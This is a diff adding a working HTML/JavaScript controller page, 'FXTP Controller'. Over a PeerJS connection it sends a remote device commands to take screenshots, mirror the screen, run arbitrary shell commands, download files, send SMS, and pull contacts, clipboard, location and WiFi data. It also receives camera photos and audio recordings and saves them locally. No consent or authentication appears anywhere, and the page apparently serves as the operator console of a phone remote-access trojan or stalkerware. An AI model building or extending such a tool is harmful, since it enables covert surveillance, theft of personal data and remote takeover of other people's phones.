@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>FXTP Controller</title>
+    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', -apple-system, 'Segoe UI', Roboto, sans-serif; }
+        body { background: #0a0a12; color: #e0e0ff; padding: 16px; min-height: 100vh; }
+        .header { background: linear-gradient(135deg, #1a1a2e, #16213e); border-radius: 20px; padding: 20px; margin-bottom: 16px; border: 1px solid #2a2a42; box-shadow: 0 8px 32px rgba(0,0,0,0.6); }
+        .header h1 { font-size: 24px; font-weight: 700; background: linear-gradient(135deg, #a855f7, #3b82f6); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .status-row { display: flex; justify-content: space-between; align-items: center; margin-top: 8px; }
+        .status { font-size: 14px; padding: 4px 14px; border-radius: 30px; background: #2a2a3e; border: 1px solid #3a3a52; }
+        .status.connected { color: #4caf50; border-color: #4caf50; }
+        .status.disconnected { color: #e94560; border-color: #e94560; }
+        .peer-id { font-size: 12px; color: #8a8a9e; background: #0b0b12; padding: 4px 12px; border-radius: 30px; border: 1px solid #2a2a3e; word-break: break-all; max-width: 60%; }
+        .card { background: #14141e; border-radius: 16px; padding: 16px; margin-bottom: 16px; border: 1px solid #2a2a3a; box-shadow: 0 4px 16px rgba(0,0,0,0.3); }
+        .card-title { font-size: 13px; color: #8a8a9e; margin-bottom: 10px; text-transform: uppercase; letter-spacing: 0.5px; }
+        .input-group { display: flex; gap: 10px; flex-wrap: wrap; }
+        .input-group input { flex: 1; background: #0b0b12; border: 1px solid #2a2a3a; border-radius: 10px; padding: 12px 16px; color: #e0e0ff; font-size: 14px; outline: none; min-width: 120px; }
+        .input-group input:focus { border-color: #7c5cfc; }
+        .btn { background: #2a2a3e; border: none; color: #e0e0ff; padding: 10px 18px; border-radius: 10px; font-size: 14px; font-weight: 600; cursor: pointer; transition: all 0.2s; display: inline-flex; align-items: center; gap: 6px; border: 1px solid transparent; }
+        .btn:active { transform: scale(0.96); }
+        .btn-primary { background: #7c5cfc; color: #fff; }
+        .btn-primary:hover { background: #6a4ae0; }
+        .btn-success { background: #2e7d32; color: #fff; }
+        .btn-success:hover { background: #1b6b22; }
+        .btn-danger { background: #e94560; color: #fff; }
+        .btn-danger:hover { background: #d43a56; }
+        .btn-outline { background: transparent; border-color: #3a3a52; }
+        .btn-outline:hover { background: #2a2a3e; }
+        .btn-sm { padding: 6px 12px; font-size: 12px; }
+        .btn-block { width: 100%; justify-content: center; }
+        .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
+        .grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px; }
+        .log { background: #0b0b12; border-radius: 12px; padding: 12px; height: 200px; overflow-y: auto; font-family: 'Fira Code', monospace; font-size: 12px; line-height: 1.6; border: 1px solid #2a2a3a; white-space: pre-wrap; word-break: break-all; }
+        .log .time { color: #6a6a82; }
+        .log .sent { color: #4caf50; }
+        .log .received { color: #ffb74d; }
+        .log .error { color: #e94560; }
+        .log .info { color: #8a8a9e; }
+        @media (max-width: 480px) { .grid-3 { grid-template-columns: 1fr 1fr; } }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <h1>⚡ FXTP Controller</h1>
+        <div class="status-row">
+            <span class="status disconnected" id="statusDisplay">🔴 Disconnected</span>
+            <span class="peer-id" id="myPeerId">Loading...</span>
+        </div>
+    </div>
+
+    <div class="card">
+        <div class="card-title">📡 Connect to Device</div>
+        <div class="input-group">
+            <input id="targetPeerId" placeholder="Enter Device Peer ID" />
+            <button class="btn btn-success" onclick="connectToPeer()">Connect</button>
+            <button class="btn btn-danger" onclick="disconnect()">Disconnect</button>
+        </div>
+    </div>
+
+    <div class="card">
+        <div class="card-title">🎮 Quick Actions</div>
+        <div class="grid-3">
+            <button class="btn btn-primary" onclick="sendCommand('screenshot')">📸 Screenshot</button>
+            <button class="btn btn-primary" onclick="sendCommand('start_mirror')">🖥️ Mirror</button>
+            <button class="btn btn-danger" onclick="sendCommand('stop_mirror')">⏹️ Stop</button>
+        </div>
+        <div class="grid-2" style="margin-top:8px;">
+            <button class="btn btn-outline" onclick="sendCommand('get_clipboard')">📋 Get Clipboard</button>
+            <button class="btn btn-outline" onclick="sendCommand('device_info')">📱 Device Info</button>
+        </div>
+    </div>
+
+    <div class="card">
+        <div class="card-title">⚙️ Advanced</div>
+        <div class="grid-2">
+            <button class="btn btn-outline btn-sm" onclick="launchApp()">🚀 Launch App</button>
+            <button class="btn btn-outline btn-sm" onclick="listFiles()">📂 List Files</button>
+            <button class="btn btn-outline btn-sm" onclick="downloadFile()">⬇️ Download</button>
+            <button class="btn btn-outline btn-sm" onclick="runShell()">💻 Shell</button>
+            <button class="btn btn-outline btn-sm" onclick="sendSms()">📩 SMS</button>
+            <button class="btn btn-outline btn-sm" onclick="getContacts()">👤 Contacts</button>
+            <button class="btn btn-outline btn-sm" onclick="getLocation()">📍 Location</button>
+            <button class="btn btn-outline btn-sm" onclick="scanWifi()">📶 WiFi</button>
+        </div>
+        <div style="margin-top:10px; display:flex; gap:6px; flex-wrap:wrap;">
+            <button class="btn btn-outline btn-sm" onclick="toggleFlashlight(true)">🔦 On</button>
+            <button class="btn btn-outline btn-sm" onclick="toggleFlashlight(false)">🔦 Off</button>
+            <button class="btn btn-outline btn-sm" onclick="vibrate()">📳 Vibrate</button>
+            <button class="btn btn-outline btn-sm" onclick="setBrightness()">☀️ Brightness</button>
+            <button class="btn btn-outline btn-sm" onclick="setVolume()">🔊 Volume</button>
+        </div>
+        <div style="margin-top:10px;">
+            <button class="btn btn-primary btn-sm" onclick="sendCommand('lock')">🔒 Lock Screen</button>
+            <button class="btn btn-primary btn-sm" onclick="displayHtml()">📄 Display HTML</button>
+        </div>
+    </div>
+
+    <div class="card">
+        <div class="card-title">📋 Log</div>
+        <div class="log" id="log">Ready.</div>
+    </div>
+
+    <script>
+        // --- State ---
+        let peer = null;
+        let connection = null;
+        let myId = '';
+        let lastAction = '';
+
+        function log(msg, type = 'info') {
+            const el = document.getElementById('log');
+            const time = new Date().toLocaleTimeString();
+            const colorClass = type === 'sent' ? 'sent' : type === 'received' ? 'received' : type === 'error' ? 'error' : 'info';
+            el.innerHTML += `<span class="time">[${time}]</span> <span class="${colorClass}">${msg}</span>\n`;
+            el.scrollTop = el.scrollHeight;
+        }
+
+        function updateStatus(connected) {
+            const el = document.getElementById('statusDisplay');
+            if (connected) {
+                el.textContent = '✅ Connected';
+                el.className = 'status connected';
+            } else {
+                el.textContent = '🔴 Disconnected';
+                el.className = 'status disconnected';
+            }
+        }
+
+        // --- PeerJS ---
+        function initPeer() {
+            peer = new Peer();
+            peer.on('open', (id) => {
+                myId = id;
+                document.getElementById('myPeerId').textContent = 'ID: ' + id;
+                log('🔑 Peer ready: ' + id, 'info');
+            });
+            peer.on('connection', (conn) => {
+                connection = conn;
+                updateStatus(true);
+                log('✅ Device connected!', 'info');
+                conn.on('data', (data) => {
+                    log('📩 Received: ' + JSON.stringify(data), 'received');
+                    handleResponse(data);
+                });
+                conn.on('close', () => {
+                    updateStatus(false);
+                    log('🔌 Disconnected.', 'info');
+                    connection = null;
+                });
+            });
+            peer.on('error', (err) => {
+                log('❌ Peer error: ' + err.message, 'error');
+            });
+        }
+
+        function connectToPeer() {
+            const target = document.getElementById('targetPeerId').value.trim();
+            if (!target) { log('❌ Enter a Peer ID.', 'error'); return; }
+            if (!peer) { log('❌ Peer not initialized.', 'error'); return; }
+            const conn = peer.connect(target);
+            conn.on('open', () => {
+                connection = conn;
+                updateStatus(true);
+                log('✅ Connected to ' + target, 'info');
+                conn.on('data', (data) => {
+                    log('📩 Received: ' + JSON.stringify(data), 'received');
+                    handleResponse(data);
+                });
+                conn.on('close', () => {
+                    updateStatus(false);
+                    log('🔌 Disconnected.', 'info');
+                    connection = null;
+                });
+            });
+            conn.on('error', (err) => {
+                log('❌ Connection error: ' + err.message, 'error');
+            });
+        }
+
+        function disconnect() {
+            if (connection) {
+                connection.close();
+                connection = null;
+                updateStatus(false);
+                log('🔌 Disconnected manually.', 'info');
+            }
+        }
+
+        // --- Send command to device ---
+        function sendCommand(type, value) {
+            if (!connection) {
+                log('❌ Not connected to any device.', 'error');
+                return;
+            }
+            const payload = { type };
+            if (value !== undefined) payload.value = value;
+            connection.send(payload);
+            log('📤 Sent: ' + type + (value ? ' (' + value + ')' : ''), 'sent');
+        }
+
+        // --- UI wrappers for commands with prompts ---
+        function launchApp() {
+            const pkg = prompt('Enter package name:');
+            if (pkg) sendCommand('launch_app', pkg);
+        }
+        function listFiles() {
+            const path = prompt('Enter path (e.g., /sdcard):', '/sdcard');
+            if (path) sendCommand('list_files', path);
+        }
+        function downloadFile() {
+            const path = prompt('Enter file path:');
+            if (path) sendCommand('download_file', path);
+        }
+        function runShell() {
+            const cmd = prompt('Enter shell command:');
+            if (cmd) sendCommand('shell', cmd);
+        }
+        function sendSms() {
+            const number = prompt('Enter phone number:');
+            if (!number) return;
+            const msg = prompt('Enter SMS message:');
+            if (msg) sendCommand('sms', number + '|' + msg);
+        }
+        function getContacts() { sendCommand('contacts'); }
+        function getLocation() { sendCommand('location'); }
+        function scanWifi() { sendCommand('wifi'); }
+        function toggleFlashlight(on) { sendCommand('flashlight', on); }
+        function vibrate() {
+            const duration = prompt('Vibration duration (ms):', '1000');
+            if (duration) sendCommand('vibrate', parseInt(duration, 10));
+        }
+        function setBrightness() {
+            const val = prompt('Brightness (0-100):', '50');
+            if (val) sendCommand('brightness', parseInt(val, 10));
+        }
+        function setVolume() {
+            const val = prompt('Volume (0-100):', '50');
+            if (val) sendCommand('volume', parseInt(val, 10));
+        }
+        function displayHtml() {
+            const html = prompt('Enter HTML code:');
+            if (html) sendCommand('html', html);
+        }
+
+        // --- Handle responses from device ---
+        function handleResponse(data) {
+            if (data.type === 'screenshot_data') {
+                const win = window.open('', '_blank');
+                if (win) {
+                    win.document.write('<img src="data:image/png;base64,' + data.value + '" style="max-width:100%;" />');
+                    win.document.title = 'Screenshot';
+                } else {
+                    log('📸 Screenshot data received (base64)', 'received');
+                }
+            } else if (data.type === 'mirror_frame') {
+                // Display frame in a new window or inline – we'll log
+                log('🖥️ Mirror frame received', 'received');
+            } else if (data.type === 'file_data') {
+                log('📁 File data received (base64)', 'received');
+                const a = document.createElement('a');
+                a.href = 'data:application/octet-stream;base64,' + data.value;
+                a.download = 'downloaded_file.bin';
+                a.click();
+            } else if (data.type === 'file_list') {
+                try {
+                    const arr = JSON.parse(data.value);
+                    log('📂 Files: ' + arr.map(f => f.name + (f.isDir ? '/' : '')).join(', '), 'received');
+                } catch (e) {
+                    log('📂 Files:\n' + data.value, 'received');
+                }
+            } else if (data.type === 'shell_result') {
+                log('💻 Shell result:\n' + data.value, 'received');
+            } else if (data.type === 'launch_result') {
+                log('🚀 ' + data.value, 'received');
+            } else if (data.type === 'notification_result') {
+                log('🔔 ' + data.value, 'received');
+            } else if (data.type === 'clipboard_result') {
+                log('📋 ' + data.value, 'received');
+            } else if (data.type === 'sms_result') {
+                log('📩 ' + data.value, 'received');
+            } else if (data.type === 'device_info') {
+                try {
+                    const info = JSON.parse(data.value);
+                    log('📱 Device Info:\n' + Object.entries(info).map(([k,v]) => k + ': ' + v).join('\n'), 'received');
+                } catch (e) {
+                    log('📱 ' + data.value, 'received');
+                }
+            } else if (data.type === 'packages') {
+                log('📦 Packages: ' + data.value, 'received');
+            } else if (data.type === 'wifi') {
+                try {
+                    const arr = JSON.parse(data.value);
+                    log('📶 WiFi: ' + arr.map(w => w.ssid + ' (' + w.rssi + 'dBm)').join(', '), 'received');
+                } catch (e) {
+                    log('📶 ' + data.value, 'received');
+                }
+            } else if (data.type === 'contacts') {
+                try {
+                    const arr = JSON.parse(data.value);
+                    log('👤 Contacts: ' + arr.map(c => c.name + ' (' + c.number + ')').join(', '), 'received');
+                } catch (e) {
+                    log('👤 ' + data.value, 'received');
+                }
+            } else if (data.type === 'location') {
+                log('📍 ' + data.value, 'received');
+            } else if (data.type === 'flashlight') {
+                log('🔦 Flashlight: ' + data.value, 'received');
+            } else if (data.type === 'vibrate') {
+                log('📳 ' + data.value, 'received');
+            } else if (data.type === 'brightness') {
+                log('☀️ ' + data.value, 'received');
+            } else if (data.type === 'volume') {
+                log('🔊 ' + data.value, 'received');
+            } else if (data.type === 'download_url_result') {
+                log('⬇️ ' + data.value, 'received');
+            } else if (data.type === 'call_result') {
+                log('📞 ' + data.value, 'received');
+            } else if (data.type === 'camera_data') {
+                // Camera photo returned as base64
+                const win = window.open('', '_blank');
+                if (win) {
+                    win.document.write('<img src="data:image/png;base64,' + data.value + '" style="max-width:100%;" />');
+                    win.document.title = 'Camera';
+                } else {
+                    log('📷 Camera photo received', 'received');
+                }
+            } else if (data.type === 'audio_data') {
+                log('🎤 Audio data received (base64)', 'received');
+                const a = document.createElement('a');
+                a.href = 'data:audio/3gpp;base64,' + data.value;
+                a.download = 'audio.3gp';
+                a.click();
+            } else if (data.type === 'error') {
+                log('❌ Error: ' + data.value, 'error');
+            } else {
+                log('📩 Unknown response: ' + JSON.stringify(data), 'info');
+            }
+        }
+
+        // --- Start ---
+        initPeer();
+        updateStatus(false);
+        log('🚀 FXTP Controller ready.', 'info');
+    </script>
+</body>
+</html>
